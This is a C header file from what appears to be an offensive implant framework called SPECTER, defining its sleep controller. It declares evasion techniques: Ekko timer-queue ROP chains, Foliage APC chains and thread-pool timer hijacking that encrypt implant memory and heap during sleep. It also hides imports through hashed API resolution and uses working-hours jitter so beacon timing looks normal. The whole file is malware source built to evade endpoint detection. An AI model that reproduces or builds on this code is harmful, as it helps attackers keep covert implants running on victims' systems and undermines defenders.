/**
 * SPECTER Implant — Sleep Controller Interface
 *
 * Ekko timer-based sleep with full memory encryption, heap tracking,
 * and jitter support.  Uses CreateTimerQueueTimer ROP chain to encrypt
 * implant memory during sleep and decrypt on wake.
 */

#ifndef SLEEP_H
#define SLEEP_H

#include "specter.h"
#include "ntdefs.h"
#include "config.h"
#include "profile.h"

/* ------------------------------------------------------------------ */
/*  Forward declaration for profile access from comms context           */
/*  (avoids circular include with comms.h)                              */
/* ------------------------------------------------------------------ */

/**
 * Get the profile pointer from a comms context.
 * Implemented in comms.c. Returns NULL if no profile is set.
 */
PROFILE_CONFIG *comms_get_profile_ptr(PVOID comms_ctx);

/* ------------------------------------------------------------------ */
/*  DJB2 hashes for API resolution                                     */
/* ------------------------------------------------------------------ */

#define HASH_ADVAPI32_DLL           0x67208A49  /* "advapi32.dll"          */
#define HASH_CREATETIMERQUEUETIMER  0x1F94D320  /* "CreateTimerQueueTimer" */
#define HASH_CREATETIMERQUEUE       0x101BB45F  /* "CreateTimerQueue"      */
#define HASH_DELETETIMERQUEUE       0xADEE00DE  /* "DeleteTimerQueue"      */
#define HASH_CREATEEVENTW           0xC612B212  /* "CreateEventW"          */
#define HASH_SETEVENT               0x11FC6813  /* "SetEvent"              */
#define HASH_CLOSEHANDLE            0x2EAC8647  /* "CloseHandle"           */
#define HASH_RTLCAPTURECONTEXT      0xD9BEFB30  /* "RtlCaptureContext"     */
#define HASH_NTCONTINUE             0x8197216C  /* "NtContinue"            */
#define HASH_SYSTEMFUNCTION032      0xD3A21DC5  /* "SystemFunction032"     */
#define HASH_WAITFORSINGLEOBJECT_K  0xDA18E23A  /* "WaitForSingleObject"   */

/* DJB2 hashes for Foliage / ThreadPool APIs (ntdll exports) */
#define HASH_NTTESTALERT_SLEEP      0xB67D903F  /* "NtTestAlert"           */
#define HASH_TPALLOCTIMER           0x879C7315  /* "TpAllocTimer"          */
#define HASH_TPSETTIMER             0x983AA036  /* "TpSetTimer"            */
#define HASH_TPRELEASETIMER         0xBFF7AD2B  /* "TpReleaseTimer"        */

/* Timer queue flags */
#define WT_EXECUTEINTIMERTHREAD     0x00000020
#define WT_EXECUTEONLYONCE          0x00000008

/* ------------------------------------------------------------------ */
/*  CONTEXT64 — x64 thread context for RtlCaptureContext / NtContinue  */
/* ------------------------------------------------------------------ */

#define CONTEXT_AMD64               0x00100000
#define CONTEXT_FULL_FLAGS          (CONTEXT_AMD64 | 0x0B)

typedef struct __attribute__((aligned(16))) _CONTEXT64 {
    /* Parameter home area (0x00–0x2F) */
    QWORD P1Home;
    QWORD P2Home;
    QWORD P3Home;
    QWORD P4Home;
    QWORD P5Home;
    QWORD P6Home;

    /* Control flags (0x30) */
    DWORD ContextFlags;
    DWORD MxCsr;

    /* Segment registers (0x38–0x44) */
    WORD  SegCs;
    WORD  SegDs;
    WORD  SegEs;
    WORD  SegFs;
    WORD  SegGs;
    WORD  SegSs;
    DWORD EFlags;

    /* Debug registers (0x48–0x77) */
    QWORD Dr0;
    QWORD Dr1;
    QWORD Dr2;
    QWORD Dr3;
    QWORD Dr6;
    QWORD Dr7;

    /* Integer registers (0x78–0xF7) */
    QWORD Rax;
    QWORD Rcx;
    QWORD Rdx;
    QWORD Rbx;
    QWORD Rsp;
    QWORD Rbp;
    QWORD Rsi;
    QWORD Rdi;
    QWORD R8;
    QWORD R9;
    QWORD R10;
    QWORD R11;
    QWORD R12;
    QWORD R13;
    QWORD R14;
    QWORD R15;

    /* Instruction pointer (0xF8) */
    QWORD Rip;

    /* Floating point / vector state (0x100–end) */
    BYTE  FltSave[512];
    BYTE  VectorRegister[416];    /* 26 * 16 */
    QWORD VectorControl;
    QWORD DebugControl;
    QWORD LastBranchToRip;
    QWORD LastBranchFromRip;
    QWORD LastExceptionToRip;
    QWORD LastExceptionFromRip;
} CONTEXT64;

/* ------------------------------------------------------------------ */
/*  USTRING — binary data descriptor for SystemFunction032             */
/* ------------------------------------------------------------------ */

typedef struct _USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

/* ------------------------------------------------------------------ */
/*  Function pointer types for resolved APIs                           */
/* ------------------------------------------------------------------ */

typedef HANDLE (__attribute__((ms_abi)) *fn_CreateTimerQueue)(void);

typedef BOOL (__attribute__((ms_abi)) *fn_CreateTimerQueueTimer)(
    PHANDLE phNewTimer, HANDLE TimerQueue,
    PVOID Callback, PVOID Parameter,
    DWORD DueTime, DWORD Period, ULONG Flags);

typedef BOOL (__attribute__((ms_abi)) *fn_DeleteTimerQueue)(
    HANDLE TimerQueue);

typedef HANDLE (__attribute__((ms_abi)) *fn_CreateEventW)(
    PVOID lpEventAttributes, BOOL bManualReset,
    BOOL bInitialState, PVOID lpName);

typedef BOOL (__attribute__((ms_abi)) *fn_SetEvent)(HANDLE hEvent);

typedef BOOL (__attribute__((ms_abi)) *fn_CloseHandle)(HANDLE hObject);

typedef void (__attribute__((ms_abi)) *fn_RtlCaptureContext)(
    CONTEXT64 *ContextRecord);

typedef NTSTATUS (__attribute__((ms_abi)) *fn_NtContinue)(
    CONTEXT64 *ContextRecord, BOOL TestAlert);

typedef NTSTATUS (__attribute__((ms_abi)) *fn_SystemFunction032)(
    USTRING *data, USTRING *key);

typedef DWORD (__attribute__((ms_abi)) *fn_WaitForSingleObject)(
    HANDLE hHandle, DWORD dwMilliseconds);

/* Foliage: NtTestAlert triggers queued APCs on the current thread */
typedef NTSTATUS (__attribute__((ms_abi)) *fn_NtTestAlert)(void);

/* ThreadPool timer APIs from ntdll (undocumented but stable) */
typedef NTSTATUS (__attribute__((ms_abi)) *fn_TpAllocTimer)(
    PVOID *Timer, PVOID Callback, PVOID Context, PVOID Environment);

typedef void (__attribute__((ms_abi)) *fn_TpSetTimer)(
    PVOID Timer, PLARGE_INTEGER DueTime, DWORD Period, DWORD Window);

typedef void (__attribute__((ms_abi)) *fn_TpReleaseTimer)(PVOID Timer);

/* ------------------------------------------------------------------ */
/*  Resolved API cache                                                 */
/* ------------------------------------------------------------------ */

typedef struct _SLEEP_API {
    fn_CreateTimerQueue       CreateTimerQueue;
    fn_CreateTimerQueueTimer  CreateTimerQueueTimer;
    fn_DeleteTimerQueue       DeleteTimerQueue;
    fn_CreateEventW           CreateEventW;
    fn_SetEvent               SetEvent;
    fn_CloseHandle            CloseHandle;
    fn_WaitForSingleObject    WaitForSingleObject;
    fn_RtlCaptureContext      RtlCaptureContext;
    fn_NtContinue             NtContinue;
    fn_SystemFunction032      SystemFunction032;
    fn_NtTestAlert            NtTestAlert;
    fn_TpAllocTimer           TpAllocTimer;
    fn_TpSetTimer             TpSetTimer;
    fn_TpReleaseTimer         TpReleaseTimer;
    BOOL                      resolved;
} SLEEP_API;

/* ------------------------------------------------------------------ */
/*  Heap allocation tracking (linked list)                             */
/* ------------------------------------------------------------------ */

#define SLEEP_MAX_HEAP_ENTRIES  64

typedef struct _HEAP_ALLOC_ENTRY {
    PVOID                      ptr;
    SIZE_T                     size;
    struct _HEAP_ALLOC_ENTRY  *next;
} HEAP_ALLOC_ENTRY;

/* ------------------------------------------------------------------ */
/*  SLEEP_CONTEXT                                                      */
/* ------------------------------------------------------------------ */

typedef struct _SLEEP_CONTEXT {
    DWORD              sleep_method;      /* SLEEP_METHOD enum             */
    PVOID              implant_base;      /* PIC blob base address         */
    SIZE_T             implant_size;      /* PIC blob size                 */
    HEAP_ALLOC_ENTRY  *heap_list;         /* Head of tracked alloc list    */
    BYTE               sleep_enc_key[32]; /* ChaCha20 key for heap encrypt */
    ULONG              original_protect;  /* Original memory protection    */
    SLEEP_API          api;               /* Resolved Win32/NT APIs        */
    HEAP_ALLOC_ENTRY   heap_pool[SLEEP_MAX_HEAP_ENTRIES]; /* Static pool  */
    DWORD              heap_pool_used;    /* Number of pool entries in use */
} SLEEP_CONTEXT;

/* ------------------------------------------------------------------ */
/*  Public API                                                         */
/* ------------------------------------------------------------------ */

/**
 * Initialize the sleep controller.
 * Resolves required APIs, sets implant base/size, initializes heap list.
 */
NTSTATUS sleep_init(IMPLANT_CONTEXT *ctx);

/**
 * Execute one sleep cycle: compute jittered interval, run selected
 * sleep method (Ekko/WFS/Delay), return.
 */
NTSTATUS sleep_cycle(IMPLANT_CONTEXT *ctx);

/**
 * Calculate a jittered sleep interval.
 * Returns interval in milliseconds with uniform random jitter applied.
 */
DWORD sleep_calc_jitter(DWORD base_interval, DWORD jitter_percent);

/**
 * Profile-aware jitter calculation.
 * Uses the timing config's jitter distribution (Gaussian/Pareto/Uniform),
 * checks working hours, applies off-hours multiplier.
 * current_hour: 0-23, current_dow: 0=Mon..6=Sun.
 * Returns interval in milliseconds.
 */
DWORD sleep_calc_profile_jitter(const TIMING_CONFIG *timing,
                                 DWORD current_hour, DWORD current_dow);

/**
 * Track a heap allocation for sleep-time encryption.
 */
void sleep_track_alloc(SLEEP_CONTEXT *sctx, PVOID ptr, SIZE_T size);

/**
 * Untrack a heap allocation (e.g., after free).
 */
void sleep_untrack_alloc(SLEEP_CONTEXT *sctx, PVOID ptr);

/**
 * Encrypt all tracked heap allocations using ChaCha20.
 */
void sleep_encrypt_heap(SLEEP_CONTEXT *sctx);

/**
 * Decrypt all tracked heap allocations using ChaCha20.
 */
void sleep_decrypt_heap(SLEEP_CONTEXT *sctx);

/* ------------------------------------------------------------------ */
/*  Internal methods (not called directly by main loop)                */
/* ------------------------------------------------------------------ */

/**
 * Ekko sleep: ROP chain via CreateTimerQueueTimer.
 * Encrypts implant memory + heap, sleeps, decrypts, restores.
 */
NTSTATUS sleep_ekko(SLEEP_CONTEXT *sctx, DWORD sleep_ms);

/**
 * Simple WaitForSingleObject-based sleep.
 */
NTSTATUS sleep_wfs(SLEEP_CONTEXT *sctx, DWORD sleep_ms);

/**
 * Simple NtDelayExecution-based sleep.
 */
NTSTATUS sleep_delay(SLEEP_CONTEXT *sctx, DWORD sleep_ms);

/**
 * Foliage sleep: APC-based memory encryption.
 * Queues an APC chain (protect RW → encrypt → delay → decrypt →
 * protect RX → NtContinue) to the current thread, then NtTestAlert
 * to trigger execution.
 */
NTSTATUS sleep_foliage(SLEEP_CONTEXT *sctx, DWORD sleep_ms);

/**
 * ThreadPool sleep: hijack the process's native thread pool.
 * Uses TpAllocTimer/TpSetTimer to schedule encrypt→sleep→decrypt
 * in a legitimate pool worker thread.
 */
NTSTATUS sleep_threadpool(SLEEP_CONTEXT *sctx, DWORD sleep_ms);

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
/**
 * Set a fixed "random" seed for deterministic jitter testing.
 */
void sleep_test_set_random_seed(DWORD seed);

/**
 * Set the implant base/size for testing without real PIC.
 */
void sleep_test_set_implant_region(PVOID base, SIZE_T size);
#endif

#endif /* SLEEP_H */
